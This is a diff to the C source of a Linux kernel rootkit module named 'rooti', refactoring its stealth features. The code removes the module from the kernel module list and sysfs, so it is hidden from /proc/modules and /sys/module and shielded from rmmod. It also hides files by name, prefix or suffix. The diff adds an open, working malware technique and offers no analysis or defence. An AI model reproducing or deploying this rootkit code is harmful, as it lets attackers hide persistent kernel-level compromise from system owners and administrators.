@@ -9,46 +9,101 @@
 #include "../config.h"
 
 /*
-    Hides the rootkit from userspace by removing it from the kernel modules list
-    and deleting its kobject from the sysfs hierarchy.
+    Removes this module from the kernel list of modules. This makes it so it
+    doesn't appear in the output of /proc/modules. This function assumes that module_mutex
+    has already been acquired.
 */
-void rooti_hideme()
+static void rooti_hideme_from_procs(void)
 {
-    list_del(&THIS_MODULE->list);
+    list_del_rcu(&THIS_MODULE->list);
+    synchronize_rcu();
+}
+
+/*
+    Removes the kobject associated with this module from the sysfs hierarchy.
+    This makes it so the kobject corresponding to this modules doesn't show up
+    as a directory under /sys/module. This function assumes that module_mutex
+    has already been acquired.
+*/
+static void rooti_hideme_from_sysfs(void)
+{
     kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
-// Determines whether the file entry qualifies to be hidden
-static bool rooti_should_hide_file(struct linux_dirent64 *record)
+/*
+    Hides the rootkit from userspace by removing the corresponding entries in
+    both procs and sysfs. This also protects it from unloading via tools like rmmod.
+*/
+int rooti_hideme()
 {
-    size_t prefix_len;
-    size_t suffix_len;
-    size_t filename_len;
+    // The mutex protecting the list of modules is not an exported symbol
+    struct mutex *__module_mutex = (struct mutex *)__kallsyms_lookup_name("module_mutex");
+    if (__module_mutex == NULL) {
+        ROOTI_DEBUG("unresolved symbol: 'module_mutex'");
+        return -EFAULT;
+    }
 
-    // Check if the entry should be hidden by its name
+    // Remove info about this module from various data structures
+    mutex_lock(__module_mutex);
+    rooti_hideme_from_procs();
+    rooti_hideme_from_sysfs();
+    mutex_unlock(__module_mutex);
+
+    return 0;
+}
+
+// Determines whether a file should be hidden by its full name
+static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
+{
     for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
         if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
             return true;
         }
     }
-    // Check if the entry's name begins with a prefix of hidden files
+    return false;
+}
+
+// Determines whether a file should be hidden because its name starts with a prefix of hidden files
+static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
+{
+    size_t filename_len = strlen(record->d_name);
+    size_t prefix_len = 0;
+    
     for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
-        filename_len = strlen(record->d_name);
         prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
         if (filename_len >= prefix_len &&
             memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
             return true;
         }
     }
-    // Check if the entry's name ends with a suffix of hidden files
+    return false;
+}
+
+// Determines whether a file should be hidden because its name ends with a suffix of hidden files
+static bool rooti_should_hide_file_by_suffix(struct linux_dirent64 *record)
+{
+    size_t filename_len = strlen(record->d_name);
+    size_t suffix_len = 0;
+
     for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
-        filename_len = strlen(record->d_name);
         suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
         if (filename_len >= suffix_len &&
             memcmp(record->d_name + filename_len - suffix_len, ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
             return true;
         }
     }
+    return false;
+}
+
+// Determines whether the file entry qualifies to be hidden
+static bool rooti_should_hide_file(struct linux_dirent64 *record)
+{
+    if (rooti_should_hide_file_by_name(record))
+        return true;
+    if (rooti_should_hide_file_by_prefix(record))
+        return true;
+    if (rooti_should_hide_file_by_suffix(record))
+        return true;
     return false;
 }
 
